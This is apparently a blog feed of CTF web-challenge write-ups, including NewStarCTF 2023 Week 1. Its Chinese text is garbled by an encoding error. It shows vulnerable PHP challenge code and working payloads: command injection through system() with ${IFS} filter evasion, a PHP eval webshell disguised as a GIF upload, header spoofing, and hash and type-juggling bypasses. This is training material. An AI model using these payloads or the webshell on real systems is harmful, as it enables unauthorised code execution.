class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//numç»è¿‡intvalåè¦å°äº2020ï¼ŒåŠ 1å†inntvalè¦å¤§äº2021ï¼Œç›´æ¥ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼š2e4ï¼Œå³/?num=2e4</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<span class="hljs-comment">//md5å¼±ç­‰äºå…¶md5åŠ å¯†åï¼Œå¼±ç­‰äºæ˜¯å…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒå†æ¯”è¾ƒã€‚è½¬æ¢çš„è§„åˆ™ä¸ºï¼Œè‹¥è¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚æ‰¾ä¸ªåŠ å¯†å‰0eå¼€å¤´åŠ å¯†åä»ä¸º0eçš„å°±è¡Œäº†</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123; <span class="hljs-comment">//get_flagä¸­ä¸èƒ½æœ‰ç©ºæ ¼</span><br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);  <span class="hljs-comment">//str_ireplaceå‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ã€‚</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>cat</code>ï¼Œç»•è¿‡å§¿åŠ¿å¤ªå¤šäº†ã€‚ã€‚<code>ca&#39;&#39;t</code>è¿˜æœ‰<code>tac</code>å•¥çš„éƒ½å¯ä»¥ã€‚å…ˆ<code>ls</code>çœ‹çœ‹å½“å‰ç›®å½•éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p>payload:<code>?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><p><code>flag&#123;7ff4de78-289c-405b-9361-313240dfdcec&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week1</title>
    <link href="/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/"/>
    <url>/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬ä¸€å‘¨</p><span id="more"></span><hr><h2 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h2><p>é¢˜ç›®æè¿°ï¼šç²—å¿ƒçš„ç½‘ç«™ç®¡ç†å‘˜æ€»ä¼šæ³„æ¼ä¸€äº›æ•æ„Ÿä¿¡æ¯åœ¨Webæ ¹ç›®å½•ä¸‹</p><p>è¿™é¢˜ä¸€å¼€å§‹æƒ³ç”¨dirsearchæ‰«çš„ï¼Œä½†æ˜¯å«Œæ—¶é—´å¤ªé•¿äº†å°±ç›´æ¥è¯•äº†ä¸€äº›æˆ‘çŸ¥é“çš„æ•æ„Ÿæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">robots.txt <span class="hljs-comment">//å‘Šè¯‰çˆ¬è™«å•¥èƒ½çˆ¬å•¥ä¸èƒ½çˆ¬ï¼Œä¸è¿‡æ²¡å•¥ç”¨ï¼Œè¿™ç©æ„å„¿å°±åƒé˜²ç›—é—¨ä¸€æ ·ï¼ŒçœŸæƒ³å·ä¸œè¥¿çš„äººæ‰ä¸ä¼šç®¡ä½ ä¸Šæ²¡ä¸Šé”</span><br>www.zip <span class="hljs-comment">//å­˜ç½‘ç«™å¤‡ä»½æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>VIMå’ŒGitæ³„éœ²æ²¡æœ‰ï¼Œå°±è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸‹è½½å†æ‰“å¼€æ‹¼ä¸€èµ·å°±æ˜¯flagäº†ã€‚</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>é¢˜ç›®æè¿°ï¼šæ™®é€šçš„ä¸Šä¼ å•¦ï¼Œå¹³å¹³æ·¡æ·¡æ‰æ˜¯çœŸ</p><p><img src="/img/a9.png" alt="a9"></p><p>çœ‹çœ‹æºç æœ‰å•¥å¥½ä¸œè¥¿æ²¡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">var</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;file&quot;</span>);<br>            <span class="hljs-keyword">var</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">var</span> allowedExtensions = [<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>];<br>            <span class="hljs-keyword">var</span> fileExtension = file.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>();<br>            <br>            <span class="hljs-keyword">if</span> (!file) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please select a file to upload.&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (!allowedExtensions.<span class="hljs-title function_">includes</span>(fileExtension)) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;é”™è¯¯çš„æ‹“å±•åï¼Œåªå…è®¸ä¸Šä¼ : JPG, JPEG, PNG, GIF&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>é™åˆ¶äº†åç¼€ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡ã€‚ä¼°è®¡æ˜¯å‰ç«¯éªŒè¯ï¼Ÿé‚£å°±ä¸Šä¼ ä¸ªä¸€å¥è¯æ”¹æˆå›¾ç‰‡æ ¼å¼ï¼ŒburpsuiteæŠ“ä¸ªåŒ…å†æ”¹å›å»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP">GIF89a<br><br><span class="hljs-meta">&lt;?php</span><br> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;viper&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/a10.png" alt="a10"></p><p>å†æ”¹æˆphpåç¼€å°±å¥½äº†ï¼Œä¸Šä¼ è·¯å¾„ç›´æ¥æ˜¾ç¤ºå†ç•Œé¢äº†ã€‚</p><p><img src="/img/a11.png" alt="a11"></p><p>ç„¶åç›´æ¥èšå‰‘è¿ï¼Œæ ¹ç›®å½•åº•ä¸‹æ‹¿flagã€‚</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>é¢˜ç›®æè¿°ï¼šæœ€åˆçš„å¼€å§‹</p><p>mdè¯´ä¸€å˜´è¿™é¢˜æœ€åä¸€æ­¥é™åˆ¶æœ¬åœ°ç”¨æˆ·æ‰èƒ½è®¿é—®å¡äº†æˆ‘è›®ä¹…ã€‚ã€‚å› ä¸ºæˆ‘çœ‹åˆ°<code>åªæœ‰æœ¬åœ°ç”¨æˆ·æ‰èƒ½è®¿é—®</code>ç¬¬ä¸€æƒ³åˆ°çš„å°±æ˜¯æ”¹<code>X-Forwarded-Forï¼š127.0.0.1</code>å’Œ<code>Client-Ip</code>å­—æ®µï¼Œä½†æ˜¯è¿™ä¿©éƒ½æ²¡ç”¨ã€‚æˆ‘å½“æ—¶äººéƒ½æ™•äº†æƒ³ä¸æ˜ç™½ä¸ºå•¥ä¸ç»™è¿‡ã€‚(æˆ‘å½“æ—¶æ€è·¯ä¹Ÿé”™äº†ï¼Œä¸€ç›´åœ¨æƒ³IPåœ°å€çš„é—®é¢˜ï¼Œåé¢è¿˜å»æ‰¾äº†<code>Authorization</code>å­—æ®µçš„ä¿¡æ¯)ã€‚è¿˜å¥½å½“æ—¶å†çœ‹å®‰æ’å†™çš„é‚£æœ¬CTFå®æˆ˜ä»å…¥é—¨åˆ°æå‡ï¼Œé‡Œé¢æœ‰ä¸ªé¢˜ç”¨çš„X-Real-IPå­—æ®µã€‚ã€‚ã€‚è¿æ°”å¥½æŠŠè¿™é¢˜åšå‡ºæ¥äº†~</p><p><img src="/img/a12.png" alt="a12"></p><p>GETä¼ å‚ï¼Œ?ctf&#x3D;ä»»æ„å°±èƒ½è¿‡äº†ã€‚</p><p><img src="/img/a13.png" alt="a13"></p><p>POSTä¼ å‚ï¼Œä»–è¯´æŠŠsecretè—èµ·æ¥äº†ï¼Œçœ‹çœ‹æºç é‡Œæœ‰æ²¡æœ‰å•¥å¥½ä¸œè¥¿ï¼š</p><p><code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; //å¤§å°å†™æ•°å­—æ··åˆï¼Œä¸€çœ¼base64</code></p><p>è§£ç ï¼š<code>n3wst4rCTF2023g00000d</code></p><p><img src="/img/a14.png" alt="a14"></p><p>poweræ˜¯å¦æ˜¯ctferï¼ŸburpsuiteæŠ“ä¸‹åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰è¿™ä¸ªå­—æ®µï¼š</p><p><img src="/img/a15.png" alt="a15"></p><p>æ”¹ä¸‹cookie</p><p><img src="/img/a16.png" alt="a16"></p><p>åé¢å°±æ˜¯æ”¹User-Agentå¤´å’ŒRefererå¤´(ä¸€ä¸ªæµè§ˆå™¨ä¿¡æ¯å•¥çš„ä¸€ä¸ªç½‘å€æ¥æº)ã€‚æœ€åä»–ä¼šæç¤ºåªæœ‰æœ¬åœ°ç”¨æˆ·æ‰èƒ½é€šè¿‡è¿™å…³ï¼Œ<code>X-Real-IP:127.0.0.1</code>å³å¯ã€‚(å¯èƒ½æˆ‘è¿™è¾ˆå­éƒ½å¿˜ä¸äº†X-Real-IPè¿™ä¸ªå¤´äº†)ã€‚</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>é¢˜ç›®æè¿°ï¼šErrâ€¦â€¦..</p><p><img src="/img/a17.png" alt="a17"></p><p>çœ‹åˆ°è¿™é¢˜æˆ‘ç¬¬ä¸€æƒ³åˆ°çš„å°±æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚ã€‚ç„¶ååœ¨é‚£è¯•49å•¥çš„ï¼Œå“ˆå“ˆã€‚ç»“æœç›´æ¥404äº†ã€‚ã€‚ä»–è¯´ç»™ä»–num1å’Œnum2ï¼Œæˆ‘å°±è¯•ç€getä¼ å‚äº†<code>?number1=1</code>,ç»“æœå‡ºäº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/a18.png" alt="a18"></p><p>flagå°±è—åœ¨é‡Œé¢ã€‚ã€‚è¿™ä¸ªç­‰å®˜æ–¹wpå‡ºæ¥äº†è¿˜è¦çœ‹ä¸€ä¸‹ï¼Œè¿™é¢˜æ„Ÿè§‰æ²¡åšæ˜ç™½ã€‚</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>é¢˜ç›®æè¿°ï¼šPHPæ˜¯ä¸–ç•Œä¸Šæœ€å®‰å…¨çš„è¯­è¨€ï¼ŒçœŸçš„å—ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-comment">//ä¸€å…±äº”ä¸ªç»•è¿‡ï¼Œéƒ½æ‹¿ä¸‹åä¼šè¯».flagçš„å†…å®¹ã€‚</span><br></code></pre></td></tr></table></figure><p>å…ˆæ˜¯key1key2ä¸ç›¸ç­‰ä½†md5åŠ å¯†åå¼±ç›¸ç­‰ã€‚è¿™ä¸œè¥¿å¯ä»¥ç”¨ç¢°æ’ä¹Ÿå¯ä»¥ç”¨ä¸¤ä¸ªä¸œè¥¿åŠ å¯†åå¾—0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚å¦‚æœè¦æ±‚å¼ºç›¸ç­‰çš„è¯ç›´æ¥è®©key1key2æ˜¯ä¸¤ä¸ªæ•°ç»„å°±è¡Œäº†(æ— æ³•å¯¹æ•°ç»„åŠ å¯†ä¼šè¿”å›null)ã€‚</p><p><code>?key1[]=1&amp;key2[]=2</code></p><p>ç¬¬äºŒä¸ªæ¡ä»¶åŒç†ï¼Œå…¶å®æˆ‘ä¹‹å‰è¿˜çœŸæ²¡ç¢°åˆ°è¿‡è¿™ç§æ¡ä»¶(ä¸€ä¸ªä¸œè¥¿MD5åŠ å¯†åç­‰äºè¯¥ä¸œè¥¿SHA1åŠ å¯†åçš„å€¼)ã€‚æˆ‘å½“æ—¶æƒ³ç€æ—¢ç„¶éƒ½æ˜¯hashå‡½æ•°é‚£å°±è®©key3ç­‰äºæ•°ç»„å‘—(å¼ºç›¸ç­‰ç»•è¿‡)ï¼Œç»“æœè¿˜çœŸç»•è¿‡äº†ã€‚</p><p><code>strcmp</code>è¿™ä¸œè¥¿ä¼šæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­å¯¹åº”ä½ç½®çš„ASCIIå¤§å°ï¼Œå¦‚æœç›¸åŒå°±ç»§ç»­æ¯”è¾ƒä¸‹ä¸€ä¸ªã€‚<code>str1&gt;str2</code>å°±è¿”å›å¤§äº0ï¼Œç›¸åŒè¿”å›0ï¼Œ<code>str1&lt;str2</code>å°±è¿”å›å°äº0ã€‚</p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)</code>é¢˜ç›®æ„æ€æ˜¯æƒ³è®©æˆ‘ä»¬è¾“å…¥çš„<code>key4</code>å’Œ<code>flag</code>ç›¸ç­‰ï¼Œä½†æˆ‘ä»¬æ ¹æœ¬ä¸çŸ¥é“<code>flag</code>æ˜¯å¤šå°‘ã€‚è¿™æ—¶å¯ä»¥è®©<code>key4</code>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ<code>strcmp</code>æ¯”è¾ƒçš„æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥å…¶å®ƒç±»å‹ä¼šæŠ¥é”™ã€‚å‡ºé”™ä¼šè¿”å›0ï¼Œå®ç°ç»•è¿‡ã€‚</p><p><code>is_numeric</code>ï¼Œè¿™ä¸ªç®€å•ï¼Œç›´æ¥<code>key5=2024a</code>å³å¯ã€‚</p><p>æœ€åä¸€æ­¥POSTä¼ <code>key3[]=~&amp;flag5=~</code>ï¼Œåªè¦æ•°ç»„çš„å€¼åˆ«è§¦å‘æ­£åˆ™åŒ¹é…å°±è¡Œã€‚</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span 